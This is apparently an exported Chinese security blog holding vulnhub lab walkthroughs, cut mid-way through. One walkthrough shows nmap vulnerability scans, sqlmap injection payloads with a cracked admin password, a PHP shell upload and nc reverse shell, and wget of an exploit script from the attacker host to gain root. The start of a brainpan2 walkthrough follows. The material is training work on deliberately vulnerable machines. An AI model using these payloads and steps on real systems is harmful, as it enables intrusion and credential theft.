attacker</span></span><br><span class="line"><span class="string">|       to more easily break the encryption and monitor or tamper with</span></span><br><span class="line"><span class="string">|       the encrypted stream.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2015-5-19</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       EXPORT-GRADE DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 512</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 512</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://weakdh.org</span></span><br><span class="line"><span class="string">|       https://www.securityfocus.com/bid/74733</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span></span><br><span class="line"><span class="string">|       of insufficient strength, especially those using one of a few commonly</span></span><br><span class="line"><span class="string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       WEAK DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 1024</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 1024</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|_      https://weakdh.org</span></span><br><span class="line"><span class="string">| ssl-poodle: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL POODLE information leak</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span></span><br><span class="line"><span class="string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span></span><br><span class="line"><span class="string">|           products, uses nondeterministic CBC padding, which makes it easier</span></span><br><span class="line"><span class="string">|           for man-in-the-middle attackers to obtain cleartext data via a</span></span><br><span class="line"><span class="string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2014-10-14</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span></span><br><span class="line"><span class="string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span></span><br><span class="line"><span class="string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span></span><br><span class="line"><span class="string">|_      https://www.securityfocus.com/bid/70574</span></span><br><span class="line"><span class="string">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">3306/tcp open  mysql      MySQL 5.0.45</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:mysql:mysql:5.0.45: </span></span><br><span class="line"><span class="string">|       CVE-2009-2446   8.5     https://vulners.com/cve/CVE-2009-2446</span></span><br><span class="line"><span class="string">|       CVE-2008-0226   7.5     https://vulners.com/cve/CVE-2008-0226</span></span><br><span class="line"><span class="string">|       CVE-2009-5026   6.8     https://vulners.com/cve/CVE-2009-5026</span></span><br><span class="line"><span class="string">|       CVE-2009-4028   6.8     https://vulners.com/cve/CVE-2009-4028</span></span><br><span class="line"><span class="string">|       CVE-2010-1848   6.5     https://vulners.com/cve/CVE-2010-1848</span></span><br><span class="line"><span class="string">|       CVE-2010-1850   6.0     https://vulners.com/cve/CVE-2010-1850</span></span><br><span class="line"><span class="string">|       CVE-2008-7247   6.0     https://vulners.com/cve/CVE-2008-7247</span></span><br><span class="line"><span class="string">|       CVE-2010-3833   5.0     https://vulners.com/cve/CVE-2010-3833</span></span><br><span class="line"><span class="string">|       CVE-2010-1849   5.0     https://vulners.com/cve/CVE-2010-1849</span></span><br><span class="line"><span class="string">|       CVE-2008-4098   4.6     https://vulners.com/cve/CVE-2008-4098</span></span><br><span class="line"><span class="string">|       CVE-2008-2079   4.6     https://vulners.com/cve/CVE-2008-2079</span></span><br><span class="line"><span class="string">|       CVE-2012-0490   4.0     https://vulners.com/cve/CVE-2012-0490</span></span><br><span class="line"><span class="string">|       CVE-2012-0484   4.0     https://vulners.com/cve/CVE-2012-0484</span></span><br><span class="line"><span class="string">|       CVE-2012-0102   4.0     https://vulners.com/cve/CVE-2012-0102</span></span><br><span class="line"><span class="string">|       CVE-2012-0101   4.0     https://vulners.com/cve/CVE-2012-0101</span></span><br><span class="line"><span class="string">|       CVE-2012-0087   4.0     https://vulners.com/cve/CVE-2012-0087</span></span><br><span class="line"><span class="string">|       CVE-2010-3838   4.0     https://vulners.com/cve/CVE-2010-3838</span></span><br><span class="line"><span class="string">|       CVE-2010-3837   4.0     https://vulners.com/cve/CVE-2010-3837</span></span><br><span class="line"><span class="string">|       CVE-2010-3836   4.0     https://vulners.com/cve/CVE-2010-3836</span></span><br><span class="line"><span class="string">|       CVE-2010-3834   4.0     https://vulners.com/cve/CVE-2010-3834</span></span><br><span class="line"><span class="string">|       CVE-2010-3682   4.0     https://vulners.com/cve/CVE-2010-3682</span></span><br><span class="line"><span class="string">|       CVE-2010-3677   4.0     https://vulners.com/cve/CVE-2010-3677</span></span><br><span class="line"><span class="string">|       CVE-2009-4019   4.0     https://vulners.com/cve/CVE-2009-4019</span></span><br><span class="line"><span class="string">|       CVE-2008-3963   4.0     https://vulners.com/cve/CVE-2008-3963</span></span><br><span class="line"><span class="string">|       CVE-2010-1626   3.6     https://vulners.com/cve/CVE-2010-1626</span></span><br><span class="line"><span class="string">|       CVE-2012-0114   3.0     https://vulners.com/cve/CVE-2012-0114</span></span><br><span class="line"><span class="string">|       CVE-2008-4456   2.6     https://vulners.com/cve/CVE-2008-4456</span></span><br><span class="line"><span class="string">|_      CVE-2012-0075   1.7     https://vulners.com/cve/CVE-2012-0075</span></span><br></pre></td></tr></table></figure>

<p>可以发现开了很多端口和服务，存在非常多的漏洞</p>
<p>点击主页上的read more,发现存在id参数，抓包直接sqlmap注入一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sqlmap.py -r sqlmap.txt</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12.1<span class="comment">#dev&#125;</span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:33:15 /2019-12-17/</span><br><span class="line"></span><br><span class="line">[10:33:15] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[10:33:16] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">[10:33:16] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=4 AND 8397=8397</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=4 OR (SELECT 1251 FROM (SELECT(SLEEP(5)))iJMb)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 7 columns</span><br><span class="line">    Payload: id=4 UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x5477494d6f456c6a6e4e72506d666a7a565248436e516d504f497075554b6169514b706166706b6e,0x7162716b71),NULL,NULL,NULL,NULL-- rTAY</span><br><span class="line">---</span><br><span class="line">[10:33:16] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[10:33:16] [INFO] fetched data logged to text files under <span class="string">&#x27;C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 10:33:16 /2019-12-17/</span><br></pre></td></tr></table></figure>

<p>得到登录的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sqlmap.py -r sqlmap.txt -D cms -T user --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.12.1<span class="comment">#dev&#125;</span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:25:54 /2019-12-17/</span><br><span class="line"></span><br><span class="line">[10:25:54] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[10:25:54] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">[10:25:54] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=4 AND 8397=8397</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=4 OR (SELECT 1251 FROM (SELECT(SLEEP(5)))iJMb)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 7 columns</span><br><span class="line">    Payload: id=4 UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x5477494d6f456c6a6e4e72506d666a7a565248436e516d504f497075554b6169514b706166706b6e,0x7162716b71),NULL,NULL,NULL,NULL-- rTAY</span><br><span class="line">---</span><br><span class="line">[10:25:54] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[10:25:54] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;cms&#x27;</span></span><br><span class="line">[10:25:54] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;cms&#x27;</span></span><br><span class="line">[10:25:54] [INFO] recognized possible password hashes <span class="keyword">in</span> column <span class="string">&#x27;user_password&#x27;</span></span><br><span class="line"><span class="keyword">do</span> you want to store hashes to a temporary file <span class="keyword">for</span> eventual further processing with other tools [y/N] N</span><br><span class="line"><span class="keyword">do</span> you want to crack them via a dictionary-based attack? [Y/n/q] Y</span><br><span class="line">[10:25:54] [INFO] using <span class="built_in">hash</span> method <span class="string">&#x27;md5_generic_passwd&#x27;</span></span><br><span class="line">what dictionary <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] default dictionary file <span class="string">&#x27;D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1\data\txt\wordlist.tx_&#x27;</span> (press Enter)</span><br><span class="line">[2] custom dictionary file</span><br><span class="line">[3] file with list of dictionary files</span><br><span class="line">&gt; 1</span><br><span class="line">[10:25:54] [INFO] using default dictionary</span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [y/N] N</span><br><span class="line">[10:25:54] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[10:25:54] [INFO] starting 12 processes</span><br><span class="line">[10:25:58] [INFO] cracked password <span class="string">&#x27;adminpass&#x27;</span> <span class="keyword">for</span> <span class="built_in">hash</span> <span class="string">&#x27;25e4ee4e9229397b6b17776bfceaf8e7&#x27;</span></span><br><span class="line">[10:26:04] [INFO] current status: ZZyZZ... \Database: cms</span><br><span class="line">Table: user</span><br><span class="line">[1 entry]</span><br><span class="line">+---------+----------------------------------------------+---------------+</span><br><span class="line">| user_id | user_password                                | user_username |</span><br><span class="line">+---------+----------------------------------------------+---------------+</span><br><span class="line">| 1       | 25e4ee4e9229397b6b17776bfceaf8e7 (adminpass) | admin         |</span><br><span class="line">+---------+----------------------------------------------+---------------+</span><br><span class="line"></span><br><span class="line">[10:26:04] [INFO] table <span class="string">&#x27;cms.`user`&#x27;</span> dumped to CSV file <span class="string">&#x27;C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129\dump\cms\user.csv&#x27;</span></span><br><span class="line">[10:26:04] [INFO] fetched data logged to text files under <span class="string">&#x27;C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 10:26:04 /2019-12-17/</span><br></pre></td></tr></table></figure>

<p>成功之后直接上传.php文件</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub64.jpg"></p>
<p>如下图所示成功上传，然后访问shell，kali端nc -lvp 5566监听</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub65.jpg"></p>
<p>成功返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.142.129: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.142.128] from (UNKNOWN) [192.168.142.129] 37560</span><br><span class="line">Linux localhost.localdomain 2.6.18-92.el5 <span class="comment">#1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux</span></span><br><span class="line"> 02:37:06 up  1:08,  0 users,  load average: 0.10, 0.08, 0.45</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">sh: no job control <span class="keyword">in</span> this shell</span><br><span class="line">sh-3.2$ id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">sh-3.2$ whoami</span><br><span class="line">apache</span><br><span class="line">sh-3.2$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">sh-3.2$</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>命令行信息收集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-3.2$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">sh-3.2$ uname -a</span><br><span class="line">Linux localhost.localdomain 2.6.18-92.el5 <span class="comment">#1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux</span></span><br><span class="line">sh-3.2$ cat /etc/*release*</span><br><span class="line">cat: /etc/lsb-release.d: Is a directory</span><br><span class="line">CentOS release 5.2 (Final)</span><br></pre></td></tr></table></figure>

<p>下载提权脚本开始提权，<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvODQ3OA==">exploits-8478<i class="fa fa-external-link-alt"></i></span></p>
<p>kali执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>shell中执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-3.2$ wget http://192.168.142.128:8000/8478.sh</span><br><span class="line">wget http://192.168.142.128:8000/8478.sh</span><br><span class="line">--02:52:03--  http://192.168.142.128:8000/8478.sh</span><br><span class="line">Connecting to 192.168.142.128:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3498 (3.4K) [text/x-sh]</span><br><span class="line">Saving to: `8478.sh<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[=======================================&gt;] 3,498       --.-K/s   in 0s     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">02:52:03 (603 MB/s) - `8478.sh&#x27;</span> saved [3498/3498]</span><br></pre></td></tr></table></figure>
<p>该漏洞利用程序需要udev进程的PID，运行脚本开始提权，该漏洞利用程序无法完美运行，在下面看到的那样，需要进行多次尝试才能获得root shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-3.2$ cat /proc/net/netlink</span><br><span class="line">sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks</span><br><span class="line">cf865000 0   2930   00000111 0        0        00000000 2</span><br><span class="line">cfebce00 0   0      00000000 0        0        00000000 2</span><br><span class="line">cfc94a00 6   0      00000000 0        0        00000000 2</span><br><span class="line">cfe70600 7   0      00000000 0        0        00000000 2</span><br><span class="line">cf86ec00 9   2260   00000000 0        0        00000000 2</span><br><span class="line">cfe5fe00 9   0      00000000 0        0        00000000 2</span><br><span class="line">cf54fc00 10  0      00000000 0        0        00000000 2</span><br><span class="line">cf517c00 11  0      00000000 0        0        00000000 2</span><br><span class="line">cfebcc00 15  0      00000000 0        0        00000000 2</span><br><span class="line">cfc94400 15  554    ffffffff 0        0        00000000 2</span><br><span class="line">cf517a00 16  0      00000000 0        0        00000000 2</span><br><span class="line">cfd2fa00 18  0      00000000 0        0        00000000 2</span><br><span class="line">sh-3.2$ sed -i -e <span class="string">&#x27;s/\r$//&#x27;</span> 8478.sh</span><br><span class="line">sh-3.2$ ./8478.sh 554</span><br><span class="line">suid.c: In <span class="keyword">function</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">suid.c:3: warning: incompatible implicit declaration of built-in <span class="keyword">function</span> <span class="string">&#x27;execl&#x27;</span></span><br><span class="line">sh-3.2$ ./8478.sh 554</span><br><span class="line">./8478.sh 554</span><br><span class="line">suid.c: In <span class="keyword">function</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">suid.c:3: warning: incompatible implicit declaration of built-in <span class="keyword">function</span> <span class="string">&#x27;execl&#x27;</span></span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">sh-3.2<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=48(apache)</span><br><span class="line">sh-3.2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub66.jpg"></p>
<p>提权成功,注意，脚本下载完成后运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i -e <span class="string">&#x27;s/\r$//&#x27;</span> 8478.sh</span><br></pre></td></tr></table></figure>

<p>这条命令很重要，不运行此命令，脚本无法执行</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan2]</title>
    <url>/2020/02/01/brainpan2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：2<br>发行日期：2013年11月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlw">https://download.vulnhub.com/brainpan/brainpan2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">_               _                           ___  </span><br><span class="line">| |             (_)                         |__ \ </span><br><span class="line">| |__  _ __ __ _ _ _ __  _ __   __ _ _ __      ) |</span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \    / / </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |  / /_ </span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_| |____|</span></span><br><span class="line"><span class="string">                        | |                       </span></span><br><span class="line"><span class="string">                        |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan已通过测试，可在以下虚拟机管理程序上运行：</p>
<ul>
<li>VMware Player 6.0.1</li>
<li>VMWare Fusion 6.0.2</li>
<li>VirtualBox 4.3.2</li>
</ul>
<p>检查以确保brainpan2.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：bf01f03ea0e7cea2553f74189ff35161SHA1：b46891cda684246832f4dbc80ec6e40a997af65a</span><br></pre></td></tr></table></figure>
<p>将brainpan2.ova导入到您首选的管理程序中，并根据需要配置网络设置。<br>它会通过DHCP获得IP地址，建议在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。<br>VulnHub独家.<br><a href="http%EF%BC%9A//blog.vulnhub.com/2013/11/competition-brainpan-2.html">博客文章</a></p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.116</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:6D:B8:70 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.116</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -v -sV -p 9999,10000 -A -T5 192.168.56.116</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     _| _|</span><br><span class="line">|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|</span><br><span class="line">|     _|_| _| _| _| _| _| _| _| _| _| _| _|</span><br><span class="line">|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</span><br><span class="line">|     [______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">|_    LOGIN AS GUEST</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.3</span><br><span class="line">|_http-title: Hacking Trends</span><br></pre></td></tr></table></figure>

<p>nc连接后然后根据具体提示输入命令，发现如下的信息，并能对文件进行一定的操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; TELL ME MORE</span><br><span class="line">    FILES    HELP    VIEW       CREATE</span><br><span class="line">    USERS    MSG     SYSTEM     BYE</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; FILES</span><br><span class="line">total 36</span><br><span class="line">-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe</span><br><span class="line">-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt</span><br><span class="line">-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt</span><br><span class="line">-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 <span class="built_in">test</span>-1</span><br><span class="line">-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 <span class="built_in">test</span>-2</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER 